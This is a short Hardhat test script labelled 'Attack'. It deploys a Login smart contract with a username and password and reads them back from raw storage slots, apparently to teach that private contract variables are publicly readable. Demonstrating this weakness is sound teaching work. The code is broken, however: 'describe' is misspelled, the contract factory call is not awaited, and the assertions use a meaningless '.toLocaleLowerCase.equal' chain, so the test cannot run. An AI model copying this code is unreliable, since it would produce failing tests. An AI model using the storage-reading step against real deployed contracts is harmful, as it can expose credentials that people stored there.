const { ethers } = require("hardhat")
const { expect } = require("chai")

const usernameBytes = ethers.utils.formatBytes32String("test");
const passwordBytes = ethers.utils.formatBytes32String("password");

decribe("Attack", async () => {
    it("It should show that anyone can access private data on blockchain", async () => {
        // Deploy the login contract
        const Login = ethers.getContractFactory("Login")
        const login = await Login.deploy(usernameBytes, passwordBytes)
        await login.deployed()

        const slot0Bytes = await ethers.provider.getStorageAt(
            login.address, 0
        )

        const slot1Bytes = await ethers.provider.getStorageAt(login.address, 1)

        console.log(ethers.utils.parseBytes32String(slot0Bytes))
        console.log(ethers.utils.parseBytes32String(slot1Bytes))

        // Confirrm the the data received from the slots are the same
        expect(ethers.utils.parseBytes32String(slot0Bytes)).toLocaleLowerCase.equal("test")
        expect(ethers.utils.parseBytes32String(slot1Bytes)).toLocaleLowerCase.equal("password")
    })
})